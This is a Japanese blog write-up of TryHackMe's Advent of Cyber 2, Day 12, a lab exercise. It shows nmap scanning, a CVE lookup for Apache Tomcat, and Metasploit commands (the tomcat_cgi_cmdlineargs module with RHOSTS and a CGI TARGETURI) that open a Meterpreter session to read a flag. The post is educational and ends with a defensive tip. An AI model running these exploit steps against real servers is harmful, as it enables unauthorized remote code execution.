---
title: "【THM: TryHackMe】Advent of Cyber 2を解いてみた【Day12】"
date: 2022-02-19T11:37:14+09:00
description:
draft: false
hideToc: false
enableToc: true
enableTocContent: false
tocPosition: inner
tocLevels: ["h2", "h3", "h4"]
tags:
- TryHackMe
- WriteUP
categories:
- WriteUP
series:
- Advent of Cyber 2
image: /posts/2021/08/img/advent-of-cyber-2-thumbnail.png
---

## はじめに

今回はWebサーバーで用いられているミドルウェアのバージョン情報から既知の脆弱性を探し、そこからWebサーバー内の情報を奪取する章になります。

{{< notice warning "警告" >}}
本記事はすべてのセキュリティに携わる人に向けて執筆しており、クラッキングを推奨するものではありません。本記事の手法を用いて、許可された環境以外で実行することは絶対にやめてください。
{{< /notice >}}

## Ready, set, elf.

### What is the version number of the web server?

> Webサーバーのバージョン番号は何ですか？

まずはnmapを使って、開いているポートを調べます。

```bash
$ nmap -Pn 10.10.XX.XX
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-19 11:55 JST
Nmap scan report for 10.10.XX.XX
Host is up (0.30s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
5357/tcp open  wsdapi
8009/tcp open  ajp13
8080/tcp open  http-proxy
```

4つのポートが開いていることが確認できます。

8080ポートにブラウザからアクセスすると、Apache Tomcatが用いられていることが確認できます。

そのバージョン番号を回答して終了です。

### What CVE can be used to create a Meterpreter entry onto the machine? (Format: CVE-XXXX-XXXX)

> このマシンにMeterpreterのエントリーを作成するために使用できるCVEは何ですか？

最初にTomcatのバージョンが分かったので、既知の脆弱性がないか調査します。

調査方法はなんでもいいですが、ここではAttackerKBを使って軽く調べてみます。

{{< blogcard title="AttackerKB," url="https://attackerkb.com/" >}}

Tomcatのバージョンを検索して見ると、それっぽいCVEが発見できるので、そのCVE番号を入力して終了です。

### What are the contents of flag1.txt

> flag1.txtの内容は何ですか

今回の問題では文章中に「Metasploit Frameworkを適切に設定し」とあるので、Metasploit Frameworkを使っていきます。

Metasploit Frameworkの使い方に慣れていない人は、TryHackMeのこちらのRoomを先に終わらせることで、大体の使い方を学べます。

{{< blogcard title="Metasploit" url="https://tryhackme.com/room/rpmetasploit" >}}

まずはMetasploitを起動して、CVE検索をします。

```bash
$ msfconsole

...

msf6 > search cve-XXXX-XXXX
```

該当するものが一つ出てくるので、それを使います。
Search結果の番号でも指定できます。

```bash
msf6 > use 0
```

設定をするために、infoを見て何を設定しなければいけないか確認します。

```bash
msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) > info
```

今回は、「RHOSTS」と「TARGETURI」を設定します。
TARGETURIに含まれているCGIスクリプトは、本文中に記述されています。

```bash
msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) > set RHOSTS 10.10.XX.XX
msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) > set TARGETURI /cgi-bin/elfwhacker.bat
```

設定ができたら、infoを確認し適切に設定できているかを確認した後、exploitしていきます。

```bash
msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) > exploit
```

これでWebサーバーのリモートコード実行が可能になったため、flag1.txtの中身を確認して終了です。

```bash
meterpreter > ls
meterpreter > cat flag1.txt
```

## おわりに

今回はWebサーバーのバージョン情報から既知の脆弱性を調査して、そこからリモートコード実行しました。

Metasploit Frameworkを使えば難しいことを考えずにコマンドを打っていくだけでRCEできてしまいます。

Webアプリケーション開発者などは、Webサーバー内部のミドルウェアのバージョン情報が外部から見えないような設定が必要です。
